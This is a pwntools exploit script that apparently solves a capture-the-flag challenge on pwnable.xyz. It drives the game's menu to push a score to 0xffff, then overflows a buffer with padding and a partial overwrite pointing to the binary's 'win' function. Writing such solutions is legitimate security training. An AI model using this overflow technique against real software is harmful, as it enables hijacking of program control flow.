from pwn import *

exe = ELF("./challenge", checksec=True)

context.binary = exe

HOST = "svc.pwnable.xyz"
PORT = 30009

gdbscript = """
set follow-fork-mode child
"""

args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def main():
    r  = conn()

    r.sendafter(b"Name: ", b"a" * 16)

    r.sendlineafter(b"> ", b"1")
    r.sendline(b"0") # lose one time to have score 0xffff

    # Score copy goes from 16bits to 64bits and fills the padding
    r.sendlineafter(b"> ", b"2")
    
    r.sendlineafter(b"> ", b"3")
    r.send(b"a" * 24 + pack(exe.symbols.win)[:2])
    
    r.sendlineafter(b"> ", b"1")    
    r.interactive()

if __name__ == "__main__":
    main()
